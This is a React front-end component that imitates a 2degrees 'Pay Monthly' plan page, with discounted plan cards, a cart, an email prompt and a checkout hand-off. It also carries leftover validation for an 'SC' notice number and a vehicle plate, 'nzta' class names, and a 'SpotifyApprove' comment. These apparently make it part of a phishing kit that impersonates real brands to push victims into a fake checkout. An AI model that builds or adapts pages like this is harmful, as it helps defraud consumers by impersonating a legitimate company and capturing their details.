import React, { useState } from 'react';
import './LoginScreen.css';

function LoginScreen({ loginName, errors, isLoading, onInputChange, onLogin, onCheckout }) {
  const [showError, setShowError] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [noticeNumber, setNoticeNumber] = useState('');
  const [activeTab, setActiveTab] = useState('carryover');
  const [cartModalOpen, setCartModalOpen] = useState(false);
  const [cartViewOpen, setCartViewOpen] = useState(false);
  const [email, setEmail] = useState('');
  const [cartItems, setCartItems] = useState([]); // ✅ ARRAY now
  const [lastAdded, setLastAdded] = useState(null); // ✅ for "Added to cart" modal

  const handleContinueClick = () => {
    if (!noticeNumber || noticeNumber.trim() === '') {
      setShowError(true);
      setErrorMsg('Please enter your notice number');
      return;
    }
    if (!noticeNumber.toUpperCase().startsWith('SC')) {
      setShowError(true);
      setErrorMsg('Notice number must start with "SC"');
      return;
    }
    if (!loginName || loginName.trim() === '') {
      setShowError(true);
      setErrorMsg('Please enter your plate number');
      return;
    }
    if (loginName.trim().length < 2) {
      setShowError(true);
      setErrorMsg('Please enter a valid plate number');
      return;
    }

    setShowError(false);
    sessionStorage.setItem('noticeNumber', noticeNumber.trim().toUpperCase());
    onInputChange('loginName', loginName.trim().toUpperCase());
    onLogin();
  };

  const handleCancel = () => {
    setShowError(false);
    setErrorMsg('');
    setNoticeNumber('');
    onInputChange('loginName', '');
  };

  // ✅ Add to cart — append instead of replace
  const handleAddToCart = (plan) => {
    setCartItems((prev) => {
      const next = [...prev, plan];
      broadcastCartCount(next.length);
      return next;
    });
    setLastAdded(plan);
    setCartModalOpen(true);
  };

  // ✅ Remove one item by index
  const handleRemoveItem = (index) => {
    setCartItems((prev) => {
      const next = prev.filter((_, i) => i !== index);
      broadcastCartCount(next.length);
      return next;
    });
  };

  // ✅ Broadcast cart count to Header
  const broadcastCartCount = (count) => {
    sessionStorage.setItem('cartCount', String(count));
    window.dispatchEvent(new CustomEvent('cartCountUpdated', { detail: count }));
  };

  const handleViewCart = () => {
    setCartModalOpen(false);
    setCartViewOpen(true);
  };

  // ✅ Compute total
  const getTotal = () => {
    return cartItems
      .reduce((sum, item) => {
        const price = parseFloat(item.price.replace('/m', '').replace('$', '')) || 0;
        return sum + price;
      }, 0)
      .toFixed(2);
  };

  const handleCheckout = () => {
    sessionStorage.setItem('cartItems', JSON.stringify(cartItems));
    sessionStorage.setItem('cartEmail', email);
    // Keep old key for backwards-compat (SpotifyApprove reads cartPlan)
    if (cartItems.length > 0) {
      sessionStorage.setItem('cartPlan', JSON.stringify(cartItems[0]));
    }
    setCartViewOpen(false);
    if (onCheckout) onCheckout();
  };

  return (
    <div className="nzta-renewal">

      {/* ─── Main ─── */}
      <main className="nzta-main">
        <h1 className="nzta-title">Pay Monthly</h1>
        <p className="nzta-intro">
          Pay Monthly phone plans with no surprises. Choose from an Unlimited* Data plan, or Carryover Data 
          plan and enjoy a Free Data Hour everyday. Sorted for families and groups too: save when you join 
          with your crew on a Group plan, all backed by our <a href="#">coverage</a>.
        </p>

        {/* ─── Tabs ─── */}
        <div className="nzta-tabs">
          <button 
            className={`nzta-tab ${activeTab === 'carryover' ? 'active' : ''}`}
            onClick={() => setActiveTab('carryover')}
          >
            Carryover data
          </button>
          <button 
            className={`nzta-tab ${activeTab === 'unlimited' ? 'active' : ''}`}
            onClick={() => setActiveTab('unlimited')}
          >
            Unlimited
          </button>
          <button 
            className={`nzta-tab ${activeTab === 'devices' ? 'active' : ''}`}
            onClick={() => setActiveTab('devices')}
          >
            Plans for extra devices
          </button>
        </div>

        {/* ─── CARRYOVER TAB CONTENT ─── */}
        {activeTab === 'carryover' && (
          <div className="nzta-cards">
            {/* Card 1 */}
            <div className="nzta-card">
              <div className="nzta-card-promo">25% OFF</div>
              <div className="nzta-card-price">
                <span className="nzta-price-old">$35</span>
                <span className="nzta-price">$26.25</span>
                <span className="nzta-period">/month</span>
              </div>
              <div className="nzta-card-data">
                <span className="nzta-gb">3GB</span>
                <span className="nzta-data-label">Carryover Data</span>
              </div>
              <div className="nzta-card-feature">
                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
              </div>
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-list">
                <p>Unlimited* Calls to NZ & Aussie</p>
                <p>Unlimited* Texts to NZ & Aussie</p>
              </div>
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-perks">
                <p><strong>Additional perks:</strong></p>
                <p>Shared Data</p>
                <p>Hotspotting included</p>
                <p>5G ready</p>
                <p>Data Sidekick plan available at $5/month</p>
                <p>eSIM ready (for supported devices)</p>
              </div>
              <div className="nzta-card-perks">
                <p>To add Group Plans please give us a call on 0800 022 055 or pop into one of our stores.</p>
              </div>
              <button
                className="nzta-add-to-cart"
                onClick={() => handleAddToCart({
                  name: '$35 Carryover Plan',
                  data: '3GB Carryover Data',
                  price: '$26.25/m'
                })}
              >
                Add to cart
              </button>
            </div>

            {/* Card 2 */}
            <div className="nzta-card">
              <div className="nzta-card-promo">25% OFF</div>
              <div className="nzta-card-price">
                <span className="nzta-price-old">$45</span>
                <span className="nzta-price">$33.75</span>
                <span className="nzta-period">/month</span>
              </div>
              <div className="nzta-card-data">
                <span className="nzta-gb">6GB</span>
                <span className="nzta-data-label">Carryover Data</span>
              </div>
              <div className="nzta-card-feature">
                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
              </div>
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-list">
                <p>Unlimited* Calls to NZ & Aussie</p>
                <p>Unlimited* Texts to NZ & Aussie</p>
              </div>
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-perks">
                <p><strong>Additional perks:</strong></p>
                <p>Shared Data</p>
                <p>Hotspotting included</p>
                <p>5G ready</p>
                <p>Data Sidekick plan available at $5/month</p>
                <p>eSIM ready (for supported devices)</p>
              </div>
              <div className="nzta-card-perks">
                <p>To add Group Plans please give us a call on 0800 022 055 or pop into one of our stores.</p>
              </div>
              <button
                className="nzta-add-to-cart"
                onClick={() => handleAddToCart({
                  name: '$45 Carryover Plan',
                  data: '6GB Carryover Data',
                  price: '$33.75/m'
                })}
              >
                Add to cart
              </button>
            </div>

            {/* Card 3 */}
            <div className="nzta-card">
              <div className="nzta-card-promo">25% OFF</div>
              <div className="nzta-card-price">
                <span className="nzta-price-old">$55</span>
                <span className="nzta-price">$41.25</span>
                <span className="nzta-period">/month</span>
              </div>
              <div className="nzta-card-data">
                <span className="nzta-gb">15GB</span>
                <span className="nzta-data-label">Carryover Data</span>
              </div>
              <div className="nzta-card-feature">
                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
              </div>
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-list">
                <p>Unlimited* Calls to NZ & Aussie</p>
                <p>Unlimited* Texts to NZ & Aussie</p>
              </div>
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-perks">
                <p><strong>Additional perks:</strong></p>
                <p>Shared Data</p>
                <p>Hotspotting included</p>
                <p>5G ready</p>
                <p>Data Sidekick plan available at $5/month</p>
                <p>eSIM ready (for supported devices)</p>
              </div>
              <div className="nzta-card-perks">
                <p>To add Group Plans please give us a call on 0800 022 055 or pop into one of our stores.</p>
              </div>
              <button
                className="nzta-add-to-cart"
                onClick={() => handleAddToCart({
                  name: '$55 Carryover Plan',
                  data: '15GB Carryover Data',
                  price: '$41.25/m'
                })}
              >
                Add to cart
              </button>
            </div>

            {/* Card 4 */}
            <div className="nzta-card">
              <div className="nzta-card-promo">25% OFF</div>
              <div className="nzta-card-price">
                <span className="nzta-price-old">$65</span>
                <span className="nzta-price">$48.75</span>
                <span className="nzta-period">/month</span>
              </div>
              <div className="nzta-card-data">
                <span className="nzta-gb">80GB</span>
                <span className="nzta-data-label">Carryover Data</span>
              </div>
              <div className="nzta-card-feature">
                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
              </div>
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-list">
                <p>Unlimited* Calls to NZ & Aussie</p>
                <p>Unlimited* Texts to NZ & Aussie</p>
              </div>
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-perks">
                <p><strong>Additional perks:</strong></p>
                <p>Shared Data</p>
                <p>Hotspotting included</p>
                <p>5G ready</p>
                <p>Data Sidekick plan available at $5/month</p>
                <p>eSIM ready (for supported devices)</p>
              </div>
              <div className="nzta-card-perks">
                <p>To add Group Plans please give us a call on 0800 022 055 or pop into one of our stores.</p>
              </div>
              <button
                className="nzta-add-to-cart"
                onClick={() => handleAddToCart({
                  name: '$65 Carryover Plan',
                  data: '80GB Carryover Data',
                  price: '$48.75/m'
                })}
              >
                Add to cart
              </button>
            </div>
          </div>
        )}

        {/* ─── UNLIMITED TAB CONTENT ─── */}
        {activeTab === 'unlimited' && (
          <div className="nzta-cards">
            <div className="nzta-card">
              <div className="nzta-card-promo">25% OFF</div>
              <div className="nzta-card-price">
                <span className="nzta-price-old">$80</span>
                <span className="nzta-price">$60</span>
                <span className="nzta-period">/month</span>
              </div>
              <div className="nzta-card-data">
                <span className="nzta-gb">Unlimited</span>
                <span className="nzta-data-label">Max speed data*</span>
              </div>
              <div className="nzta-card-feature">
                <img src={require('../assets/2d-iclons/10.svg').default} alt="Contact us" className="nzta-love-img" />
                <p><strong>Free Unlimited Data</strong><br />for an hour every day***</p>
              </div>
              
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-list">
                <p>Unlimited* Calls to NZ & Aussie</p>
                <p>Unlimited* Texts to NZ & Aussie</p>
              </div>
              <div className="nzta-card-divider"></div>
              <div className="nzta-card-perks">
                <p><strong>Additional perks:</strong></p>
                <p>Unlimited* Hotspotting included</p>
                <p>5G ready</p>
                <p>50GB Sharing Data</p>
                <p>Data Sidekick plan available at $5/month</p>
                <p>Group Plans available from $25/month</p>
                <p>eSIM ready (for supported devices)</p>
              </div>
              <div className="nzta-card-link">
                <a href="#">Things to know</a>
              </div>
              <button
                className="nzta-add-to-cart"
                onClick={() => handleAddToCart({
                  name: '$80 Unlimited Plan',
                  data: 'Unlimited Max speed data',
                  price: '$60/m'
                })}
              >
                Add to cart
              </button>
            </div>
          </div>
        )}

        {/* ─── DEVICES TAB CONTENT ─── */}
        {activeTab === 'devices' && (
          <div className="nzta-cards">
            <div className="nzta-card">
              <div className="nzta-card-promo">25% OFF</div>
              <div className="nzta-card-price">
                <span className="nzta-price-old">$5</span>
                <span className="nzta-price">$3.75</span>
                <span className="nzta-period">/month</span>
              </div>
              <div className="nzta-card-data">
                <span className="nzta-gb">Data Sidekick</span>
                <span className="nzta-data-label">for tablets</span>
              </div>
              <div className="nzta-card-list" style={{ marginTop: '20px' }}>
                <p>Receives Shared data from your eligible Pay Monthly plan</p>
                <p>Calls and Texts at standard casual rates</p>
                <p>Manage how much data you share via the 2degrees app</p>
              </div>
              <button
                className="nzta-add-to-cart"
                onClick={() => handleAddToCart({
                  name: 'Data Sidekick',
                  data: 'for tablets',
                  price: '$3.75/m'
                })}
              >
                Add to cart
              </button>
            </div>
          </div>
        )}

        {/* ─── What you'll love ─── */}
        <div className="nzta-love-section">
          <h2 className="nzta-love-title">What you’ll love</h2>
          <p className="nzta-love-sub">Curious types can click the icons to reveal more information.</p>
          <div className="nzta-love-grid">
            <div className="nzta-love-item">
              <img src={require('../assets/2d-iclons/1.svg').default} alt="Uncapped Carryover" className="nzta-love-img" />
              <h3>Uncapped Carryover</h3>
              <p>Keep all of your unused data for 12 months.</p>
            </div>
            <div className="nzta-love-item">
              <img src={require('../assets/2d-iclons/2.svg').default} alt="Free Data Hour" className="nzta-love-img" />
              <h3>Free Data Hour***</h3>
              <p>1 hour of unlimited data to use every day on top of your Carryover plan data.</p>
            </div>
            <div className="nzta-love-item">
              <img src={require('../assets/2d-iclons/3.svg').default} alt="Open Term" className="nzta-love-img" />
              <h3>Open Term</h3>
              <p>Change plans whenever it suits you.</p>
            </div>
            <div className="nzta-love-item">
              <img src={require('../assets/2d-iclons/4.svg').default} alt="Shared Data" className="nzta-love-img" />
              <h3>Shared Data</h3>
              <p>Share data for free to other 2degrees mobiles on Carryover plans.</p>
            </div>
            <div className="nzta-love-item">
              <img src={require('../assets/2d-iclons/5.svg').default} alt="Hotspotting included" className="nzta-love-img" />
              <h3>Hotspotting included</h3>
              <p>Turn your phone into a Wifi modem for free with no limits.</p>
            </div>
            <div className="nzta-love-item">
              <img src={require('../assets/2d-iclons/6.svg').default} alt="5G ready" className="nzta-love-img" />
              <h3>5G ready</h3>
              <p>Harness the power of the next generation of wireless technology.</p>
            </div>
            <div className="nzta-love-item">
              <img src={require('../assets/2d-iclons/7.svg').default} alt="Group Plans" className="nzta-love-img" />
              <h3>Group Plans</h3>
              <p>Save by adding up to 5 people to your mobile plan.</p>
            </div>
            <div className="nzta-love-item">
              <img src={require('../assets/2d-iclons/8.svg').default} alt="Contact us" className="nzta-love-img" />
              <h3>Contact us</h3>
              <p>Need help? Grab a hand from one of our Customer Care Specialists.</p>
            </div>
          </div>
        </div>
      </main>

      {/* ─── ADDED TO CART MODAL ─── */}
      {cartModalOpen && lastAdded && (
        <div className="nzta-modal-overlay" onClick={() => setCartModalOpen(false)}>
          <div className="nzta-modal" onClick={(e) => e.stopPropagation()}>
            <button className="nzta-modal-close" onClick={() => setCartModalOpen(false)}>
              ✕
            </button>

            <h2 className="nzta-modal-title">Added to cart</h2>

            <div className="nzta-modal-notice">
              <span className="nzta-modal-emoji">😎</span>
              <p>
                {cartItems.length > 1
                  ? `You now have ${cartItems.length} plans in your cart.`
                  : 'Your plan has been added to the cart.'}
              </p>
            </div>

            <div className="nzta-modal-plan">
              <img
                src={require('../assets/2d-iclons/11.png')}
                alt={lastAdded.name}
                className="nzta-modal-plan-img"
              />
              <div className="nzta-modal-plan-info">
                <p className="nzta-modal-plan-name">{lastAdded.name}</p>
                <p className="nzta-modal-plan-data">{lastAdded.data}</p>
                <p className="nzta-modal-plan-price">{lastAdded.price}</p>
              </div>
            </div>

            <div className="nzta-modal-actions">
              <button className="nzta-modal-btn" onClick={handleViewCart}>
                View Cart
              </button>
              <button
                className="nzta-modal-btn nzta-modal-btn-secondary"
                onClick={() => setCartModalOpen(false)}
              >
                Continue Shopping
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ─── YOUR CART MODAL ─── */}
      {cartViewOpen && (
        <div className="nzta-cart-overlay" onClick={() => setCartViewOpen(false)}>
          <div className="nzta-cart-modal" onClick={(e) => e.stopPropagation()}>
            <button className="nzta-cart-close" onClick={() => setCartViewOpen(false)}>
              ✕
            </button>

            <h2 className="nzta-cart-title">Your cart</h2>
            <p className="nzta-cart-count">
              {cartItems.length} {cartItems.length === 1 ? 'item' : 'items'}
            </p>

            {/* ─── Plans list ─── */}
            <div className="nzta-cart-plans">
              {cartItems.length === 0 && (
                <p style={{ color: '#5e6f7e', fontSize: 14, padding: '20px 0' }}>
                  Your cart is empty.
                </p>
              )}
              {cartItems.map((item, index) => (
                <div className="nzta-cart-plan" key={index}>
                  <img
                    src={require('../assets/2d-iclons/11.png')}
                    alt={item.name}
                    className="nzta-cart-plan-img"
                  />
                  <div className="nzta-cart-plan-info">
                    <p className="nzta-cart-plan-name">{item.name}</p>
                    <p className="nzta-cart-plan-data">{item.data}</p>
                    <p className="nzta-cart-plan-price">{item.price}</p>
                  </div>
                  <button
                    className="nzta-cart-remove"
                    onClick={() => handleRemoveItem(index)}
                  >
                    Remove
                  </button>
                </div>
              ))}
            </div>

            {/* ─── Summary ─── */}
            {cartItems.length > 0 && (
              <div className="nzta-cart-summary">
                <h3 className="nzta-cart-summary-title">Summary</h3>
                <div className="nzta-cart-summary-row">
                  <span>Monthly payments</span>
                  <span>${getTotal()}</span>
                </div>
                <p className="nzta-cart-summary-note">All costs include GST</p>
              </div>
            )}

            {/* ─── Email ─── */}
            <p className="nzta-cart-email-msg">
              Let's grab your email address and speed you through the checkout process
            </p>
            <div className="nzta-cart-field">
              <label htmlFor="cart-email">Email address</label>
              <input
                id="cart-email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="nzta-cart-input"
              />
            </div>

            {/* ─── Checkout ─── */}
            <div className="nzta-cart-actions">
              <button
                className="nzta-cart-checkout"
                onClick={handleCheckout}
                disabled={cartItems.length === 0}
              >
                Checkout
              </button>
              <button
                className="nzta-cart-continue"
                onClick={() => setCartViewOpen(false)}
              >
                Continue Shopping
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default LoginScreen;